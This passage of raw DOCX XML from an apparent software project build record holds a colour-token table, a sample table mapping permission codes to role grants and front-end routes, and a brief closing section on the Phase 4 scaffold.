              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Page background, sidebar fill</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="198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base-elev</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#EEF1F7</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5953"/>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Cards, hover surfaces</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>ink</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#2F3545</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5953"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Body text, headings, icons</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="198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ink-soft</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#4B5563</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5953"/>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Captions, helper text, table headers</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>border</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#E5E7EB</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5953"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>1px hairlines, input borders</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="198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accent</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#4F5DFF</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5953"/>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Primary CTAs, active nav, links, focus rings</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>accent-hover</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#5B6CFF</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5953"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Hover state for accent</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="198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success</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#4CAF50</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5953"/>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OK badges, active dots</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>warning</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#F59E0B</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5953"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Soft alerts, 'Coming soon' badge background</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>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danger</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>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#EF4444</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5953"/>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Error banners, 403 page ShieldOff icon</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>badge</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>#8B5CF6</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5953"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Role pill (SUPER_ADMIN / NORMAL_USER / …)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>A.3  Sample Permission Codes Used in Phase 4</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80" w:line="300" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b w:val="0"/>
          <w:i/>
          <w:color w:val="4B5563"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Not exhaustive (the full 40-code matrix lives in Phase 3's seed file 006). These are the codes referenced by the FE Sidebar and routing.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="left"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3400"/>
        <w:gridCol w:w="3400"/>
        <w:gridCol w:w="3400"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>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Permission code</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3118"/>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Default role grant</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3402"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F4E79"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>FE route gated by it</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>auth:login</w:t>
            </w:r>
          </w:p>
        </w:tc>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Every role</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Not gated — implicit (login endpoint is public)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="283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dashboard:view</w:t>
            </w:r>
          </w:p>
        </w:tc>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Every role except VIEW_ONLY_USER</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/dashboard</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>equipment:read-list</w:t>
            </w:r>
          </w:p>
        </w:tc>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Every role</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/equipment</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="283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job_request:read-own</w:t>
            </w:r>
          </w:p>
        </w:tc>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Every role</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/job-requests</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>job_card:read-list</w:t>
            </w:r>
          </w:p>
        </w:tc>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Every role except VIEW_ONLY</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/job-cards</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="283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inquiry:search-instruments</w:t>
            </w:r>
          </w:p>
        </w:tc>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Every role</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/inquiry</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>audit_log:read</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3118"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>SUPER_ADMIN + LAB_IN_CHARGE</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3402"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>/audit</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>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user:read-list</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3118"/>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SUPER_ADMIN only</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3402"/>
            <w:shd w:val="clear" w:color="auto" w:fill="F3F4F6"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>/admin/users</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>A.4  Final Word</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80" w:line="300" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Phase 4 was the hardest mile because it set the template. Every subsequent module Phase 5–8 ships against this scaffold. Read this document before starting Phase 5 — the rationale behind every middleware ordering choice, every cookie attribute, every permission-check pattern is captured here so you do not have to rediscover it.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80" w:line="300" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b w:val="0"/>
          <w:i/>
          <w:color w:val="4B5563"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>— Generated as the build record companion to TECHNICALbaseORDERSphase.pdf</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35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